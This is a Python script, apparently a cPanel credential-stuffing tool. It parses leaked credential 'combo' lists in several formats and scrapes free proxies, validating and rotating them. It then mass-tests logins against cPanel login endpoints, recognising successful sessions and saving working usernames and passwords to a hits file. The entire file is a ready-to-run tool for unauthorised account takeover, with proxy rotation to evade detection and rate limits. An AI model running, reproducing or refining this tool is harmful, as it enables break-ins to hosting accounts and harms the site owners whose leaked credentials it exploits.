#!/usr/bin/env python3
"""
CIAB Random Tester + Auto Proxy (AUTO MODE)
Fully automatic - no prompts. Scrapes proxies, checks combo.txt.
Handles: domain:port:user:pass, domain:port/:user:pass, domain:user:pass, etc.
Usage:
  python cpanel_fast.py              (default: combo.txt)
  python cpanel_fast.py yourlist.txt
"""
import sys, os, re, time, threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
requests.packages.urllib3.disable_warnings()

# ======================== CONFIG ========================

THREADS = 25
TIMEOUT = 7
MAX_PROXY_VALID = 500

# ======================== PROXY SCRAPER ========================

PROXY_SOURCES = {
    'proxyscrape_http': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=http',
        'type': 'protocol_format'},
    'proxyscrape_socks4': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks4',
        'type': 'protocol_format'},
    'proxyscrape_socks5': {
        'url': 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&protocol=socks5',
        'type': 'protocol_format'},
    'proxifly_all': {
        'url': 'https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt',
        'type': 'protocol_format'},
    'spys_me': {
        'url': 'http://spys.me/proxy.txt',
        'type': 'spys'},
}

def parse_proxy_line(line, source_type):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    if source_type == 'protocol_format':
        m = re.match(r'^(https?|socks4|socks5)://([0-9.]+):(\d+)', line)
        if m:
            proto = m.group(1)
            if proto in ('http','https'):
                return ('http', m.group(2), m.group(3))
            elif proto == 'socks4':
                return ('socks4', m.group(2), m.group(3))
            elif proto == 'socks5':
                return ('socks5', m.group(2), m.group(3))
        return None
    elif source_type == 'spys':
        m = re.match(r'^([0-9.]+):(\d+)', line)
        return ('http', m.group(1), m.group(2)) if m else None
    return None

def scrape_source(name, info, timeout=15):
    proxies = []
    try:
        resp = requests.get(info['url'], headers={'User-Agent': 'Mozilla/5.0'}, timeout=timeout, verify=False)
        if resp.status_code == 200:
            for line in resp.text.split('\n'):
                p = parse_proxy_line(line, info['type'])
                if p:
                    proxies.append(p)
            print(f'  [+] {name}: {len(proxies)} proxies')
        else:
            print(f'  [?] {name}: HTTP {resp.status_code}')
    except Exception as e:
        print(f'  [?] {name}: {type(e).__name__}')
    return proxies

def scrape_all_proxies():
    print('\n[*] Scraping proxies...')
    print('-' * 50)
    all_raw = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        fm = {ex.submit(scrape_source, n, i): n for n, i in PROXY_SOURCES.items()}
        for f in as_completed(fm):
            all_raw.extend(f.result())
    seen = set()
    uniq = []
    for p in all_raw:
        k = (p[0], p[1], p[2])
        if k not in seen:
            seen.add(k)
            uniq.append(p)
    print('-' * 50)
    print(f'  Total unique: {len(uniq)}')
    return uniq

def check_proxy(pinfo, test_url='https://api.ipify.org?format=json', timeout=5):
    pt, ip, port = pinfo
    if pt == 'http':
        pd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
    elif pt == 'socks4':
        pd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
    elif pt == 'socks5':
        pd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
    else:
        return None
    try:
        t0 = time.time()
        r = requests.get(test_url, proxies=pd, timeout=timeout, verify=False)
        if r.status_code == 200:
            return {'type': pt, 'ip': ip, 'port': port,
                    'proxy_str': f'{pt}://{ip}:{port}',
                    'requests_dict': pd, 'latency': round(time.time()-t0, 2)}
    except:
        pass
    return None

def validate_proxies(plist, max_workers=100, max_valid=500):
    print(f'\n[*] Validating {len(plist)} proxies (5s timeout)...')
    print('-' * 50)
    working, done, lock = [], 0, threading.Lock()
    def check(p):
        nonlocal done
        r = check_proxy(p)
        with lock:
            done += 1
            if done % 100 == 0:
                print(f'  {done}/{len(plist)} ... {len(working)} working')
        return r
    with ThreadPoolExecutor(max_workers) as ex:
        for f in as_completed({ex.submit(check, p): p for p in plist}):
            if len(working) >= max_valid:
                break
            r = f.result()
            if r:
                working.append(r)
    working.sort(key=lambda x: x['latency'])
    print(f'  [+] Working: {len(working)}')
    return working

# ======================== PROXY ROTATOR ========================

class ProxyRotator:
    def __init__(self, plist):
        self.proxies = plist[:]
        self.idx = 0
        self.lock = threading.Lock()
    def get(self):
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.idx]
            self.idx = (self.idx + 1) % len(self.proxies)
            return p
    def remove(self, proxy):
        with self.lock:
            if proxy in self.proxies:
                self.proxies.remove(proxy)
                if self.idx >= len(self.proxies) and self.proxies:
                    self.idx = 0
    @property
    def count(self):
        return len(self.proxies)

# ======================== CREDENTIAL EXTRACTION (IMPROVED) ========================

def extract_credentials(line):
    """
    Extract (url, username, password) using multiple strategies.
    Supports: user:pass@url, url|user|pass, url:user:pass,
              domain:port:user:pass, domain:port/:user:pass, etc.
    """
    raw = line.strip()
    if not raw or len(raw) < 6:
        return None

    # Strategy 1: user:pass@url
    if '@' in raw and ':' in raw.split('@')[0]:
        left, right = raw.rsplit('@', 1)
        if ':' in left:
            user, pwd = left.split(':', 1)
            return right, user, pwd

    # Strategy 2: url|user|pass
    if '|' in raw:
        parts = raw.split('|')
        if len(parts) >= 3:
            return parts[0], parts[1], '|'.join(parts[2:])

    # Strategy 3: domain:port/:user:pass  or  domain:port:user:pass
    # Look for pattern where second colon-separated part is a port number
    # (handles: domain.com:2082:user:pass  or  domain.com:2082/:user:pass)
    parts = raw.split(':')
    if len(parts) >= 4:
        # Check if parts[1] contains a port (digits) and parts[2] is username
        port_part = parts[1].rstrip('/')
        if port_part.isdigit():
            # Found: host:port:user:pass(rest)
            host = parts[0]
            port = port_part
            user = parts[2]
            # Everything after the colon after username is the password
            # (passwords can contain colons: parts[3:]) 
            after_user = raw[raw.find(':', raw.find(':', raw.find(':')+1)+1)+1:]
            pwd = after_user
            return f"{host}:{port}", user, pwd

    # Strategy 4: url:user:pass (simple, 3 parts)
    if raw.count(':') == 2 and '://' not in raw:
        p_parts = raw.split(':')
        if len(p_parts) == 3:
            return p_parts[0], p_parts[1], p_parts[2]

    # Strategy 5: look for URL-like pattern, then guess user/pass from rest
    url_match = re.search(r'(https?://[^/\s]+(?::\d+)?)', raw)
    if url_match:
        url = url_match.group(1)
        rest = raw[url_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return url, tokens[0], tokens[1]

    # Strategy 6: domain match + extract user/pass from rest
    domain_match = re.search(r'([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})(?::\d+)?', raw)
    if domain_match:
        domain = domain_match.group(0)
        rest = raw[domain_match.end():].strip()
        tokens = re.findall(r'[a-zA-Z0-9@_.-]+', rest)
        if len(tokens) >= 2:
            return f"http://{domain}", tokens[0], tokens[1]

    return None

def normalize_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    if not re.search(r':\d+', url):
        if url.startswith('https'):
            url += ':2083'
        else:
            url += ':2082'
    return url.rstrip('/')

def test_login(norm_url, user, pwd, rotator=None, timeout=TIMEOUT):
    """IDENTICAL hit detection as original script."""
    login_url = f"{norm_url}/login/?login_only=1"
    payload = {'user': user, 'pass': pwd, 'goto_uri': '/'}
    proxies_dict = None
    used_proxy = None
    if rotator:
        used_proxy = rotator.get()
        if used_proxy:
            proxies_dict = used_proxy['requests_dict']
    try:
        r = requests.post(login_url, data=payload, timeout=timeout,
                          verify=False, allow_redirects=False, proxies=proxies_dict)
        if r.status_code == 200 and ('security_token' in r.text or 'cpsess' in r.text):
            return True, norm_url, used_proxy
        return False, None, used_proxy
    except requests.exceptions.ProxyError:
        if used_proxy and rotator:
            rotator.remove(used_proxy)
        return False, None, None
    except:
        return False, None, None

# ======================== PROXY CACHE ========================

CACHE_FILE = 'working_proxies.txt'

def get_working_proxies():
    """Auto: try cache, else scrape+validate. No prompts."""
    if os.path.exists(CACHE_FILE):
        proxies = []
        with open(CACHE_FILE, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) >= 3:
                    pt, ip, port = parts[0], parts[1], parts[2]
                    lat = float(parts[3]) if len(parts) > 3 else 0
                    if pt == 'http':
                        rd = {'http': f'http://{ip}:{port}', 'https': f'http://{ip}:{port}'}
                    elif pt == 'socks4':
                        rd = {'http': f'socks4://{ip}:{port}', 'https': f'socks4://{ip}:{port}'}
                    elif pt == 'socks5':
                        rd = {'http': f'socks5://{ip}:{port}', 'https': f'socks5://{ip}:{port}'}
                    else:
                        continue
                    proxies.append({'type': pt, 'ip': ip, 'port': port,
                                    'proxy_str': f'{pt}://{ip}:{port}',
                                    'requests_dict': rd, 'latency': lat})
        if proxies:
            print(f'[+] Loaded {len(proxies)} cached proxies')
            return proxies

    raw = scrape_all_proxies()
    if not raw:
        print('[!] No proxies scraped')
        return []
    wp = validate_proxies(raw, max_workers=100, max_valid=MAX_PROXY_VALID)
    if not wp:
        print('[!] No working proxies found')
        return []

    with open(CACHE_FILE, 'w', encoding='utf-8') as f:
        for p in wp:
            f.write(f"{p['type']}|{p['ip']}|{p['port']}|{p['latency']}\n")
    print(f'[+] Saved {len(wp)} proxies to {CACHE_FILE}')

    c = {'http': 0, 'socks4': 0, 'socks5': 0}
    for p in wp:
        if p['type'] in c:
            c[p['type']] += 1
    print(f'    HTTP:{c["http"]} SOCKS4:{c["socks4"]} SOCKS5:{c["socks5"]}')
    return wp

# ======================== MAIN ========================

def main():
    print('=' * 70)
    print('CIAB Random Tester + Auto Proxy (AUTO MODE)')
    print(f'Threads: {THREADS} | Timeout: {TIMEOUT}s')
    print('Sources: ProxyScrape, Proxifly, spys.me')
    print('=' * 70)

    fname = sys.argv[1] if len(sys.argv) > 1 else 'combo.txt'
    if not os.path.exists(fname):
        print(f'[!] File not found: {fname}')
        print('    Create combo.txt or run: python cpanel_fast.py yourlist.txt')
        return

    with open(fname, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()

    raw_combos = []
    for line in lines:
        c = extract_credentials(line)
        if c:
            raw_combos.append(c)

    if not raw_combos:
        print('[!] No combos extracted.')
        return

    combos = [(normalize_url(url), user, pwd) for url, user, pwd in raw_combos]
    total = len(combos)
    print(f'\n[+] {fname}: {total} combos loaded')

    # --- Proxy (auto: always on) ---
    print('\n[*] Proxy: ON')
    rotator = None
    wp = get_working_proxies()
    if wp:
        rotator = ProxyRotator(wp)
        print(f'[+] Rotator: {rotator.count} proxies')

    # --- Check (threaded) ---
    print('\n' + '=' * 70)
    print(f'CHECKING ({THREADS} threads)')
    print('=' * 70)

    hit_file = 'hit.txt'
    open(hit_file, 'w').close()

    hits_list = []
    tested = 0
    hit_lock = threading.Lock()
    print_lock = threading.Lock()

    def check_one(norm_url, user, pwd):
        nonlocal tested
        ok, nurl, used = test_login(norm_url, user, pwd, rotator, timeout=TIMEOUT)
        with print_lock:
            tested += 1
            mark = ' HIT' if ok else ' FAIL'
            print(f'[{tested}/{total}] {user}@{norm_url}{mark}')
        if ok:
            with hit_lock:
                hits_list.append((user, pwd, nurl, used))

    with ThreadPoolExecutor(max_workers=THREADS) as ex:
        futures = [ex.submit(check_one, u, usr, pwd) for u, usr, pwd in combos]
        for f in futures:
            f.result()

    # --- Results ---
    print('\n' + '=' * 70)
    print('RESULTS')
    print('=' * 70)
    print(f'  Tested: {total}  Hits: {len(hits_list)}')

    if hits_list:
        with open(hit_file, 'a', encoding='utf-8') as f:
            for user, pwd, nurl, used in hits_list:
                pi = f' |proxy:{used["proxy_str"]}' if used else ''
                f.write(f'{user}:{pwd}@{nurl}{pi}\n')

        print(f'\n  Saved to: {hit_file}')
        print('\n  Hit details:')
        print('  ' + '-' * 60)
        for user, pwd, nurl, used in hits_list:
            print(f'  Link:  {nurl}')
            print(f'  User:  {user}')
            print(f'  Pass:  {pwd}')
            if used:
                print(f'  Proxy: {used["proxy_str"]}')
            print('  ' + '-' * 60)
    else:
        print('  No hits found.')

    if rotator:
        print(f'  Proxy pool remaining: {rotator.count}')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Stopped')